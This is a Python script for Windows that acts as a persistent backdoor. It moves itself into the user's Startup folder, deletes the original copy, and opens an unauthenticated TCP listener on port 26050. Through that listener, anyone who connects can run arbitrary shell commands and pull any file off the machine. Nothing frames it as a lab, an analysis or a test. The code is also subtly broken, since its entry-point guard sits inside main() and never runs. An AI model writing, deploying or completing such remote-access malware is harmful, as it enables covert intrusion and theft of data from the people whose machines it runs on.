import os
import socket
import subprocess
from datetime import datetime
import shutil
import sys

def main():
    # Define the target directory
    target_directory = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Get the current script path
    current_script_path = os.path.abspath(__file__)
    current_script_directory = os.path.dirname(current_script_path)

    # Check if the script is already in the target directory
    if current_script_directory != os.path.abspath(target_directory):
        # Construct the target path for the script
        target_script_path = os.path.join(target_directory, os.path.basename(current_script_path))
        
        # Create the target directory if it doesn't exist
        if not os.path.exists(target_directory):
            os.makedirs(target_directory)
        
        # Copy the script to the target directory
        shutil.copy(current_script_path, target_script_path)
        
        # Delete the original script to simulate a move operation
        os.remove(current_script_path)
        
        # Re-run the script from the new location
        os.execv(sys.executable, [sys.executable] + [target_script_path] + sys.argv[1:])
    
    # Continue with the rest of the code
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)

    def format_directory_listing(directory):
        try:
            files = os.listdir(directory)
            result = f"Volume in drive {os.path.splitdrive(directory)[0]} has no label.\n"
            result += f" Directory of {directory}\n\n"
            
            total_size = 0
            dir_count = 0
            file_count = 0

            for file in files:
                path = os.path.join(directory, file)
                stat = os.stat(path)
                file_size = stat.st_size
                is_dir = os.path.isdir(path)
                total_size += file_size if not is_dir else 0
                dir_count += 1 if is_dir else 0
                file_count += 1 if not is_dir else 0
                modification_time = datetime.fromtimestamp(stat.st_mtime).strftime('%d-%m-%Y %H:%M')
                result += f"{modification_time}    <DIR>          {file}\n" if is_dir else f"{modification_time}               {file_size} {file}\n"

            total, used, free = shutil.disk_usage(directory)
            result += f"               {file_count} File(s)            {total_size} bytes\n"
            result += f"              {dir_count} Dir(s)  {free} bytes free"
            return result
        
        except Exception as e:
            return f"Error: {str(e)}"

    def execute_command(command):
        try:
            if command == 'terminate':
                os._exit(0)
            elif command == 'cd..':
                os.chdir('..')
                return f"Changed directory to {os.getcwd()}"
            elif command.startswith('cd '):
                directory = command.split(' ', 1)[1]
                os.chdir(directory)
                return f"Changed directory to {os.getcwd()}"
            elif command == 'ls':
                return format_directory_listing(os.getcwd())
            elif command.startswith('msg: '):
                message = command.split(' ', 1)[1]
                return f"Message printed: {message}"
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                return result.stdout + result.stderr
        except Exception as e:
            return f"Error: {str(e)}"

    def start_server():
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((local_ip, 26050))
        server_socket.listen(5)
        print(f"Server started at {local_ip} on port 26050")

        while True:
            client_socket, addr = server_socket.accept()
            print(f"Connection from {addr}")
            data = client_socket.recv(1024).decode()
            if data.startswith("get: "):
                file_name = data.split("get: ")[1]
                try:
                    with open(file_name, 'rb') as f:
                        while True:
                            file_data = f.read(1024)
                            if not file_data:
                                break
                            client_socket.sendall(file_data)
                    client_socket.sendall(b"")
                except Exception as e:
                    client_socket.sendall(f"Error: {str(e)}".encode())
            else:
                response = execute_command(data)
                client_socket.sendall(response.encode())
            client_socket.close()

    if __name__ == "__main__":
        main()
        start_server()
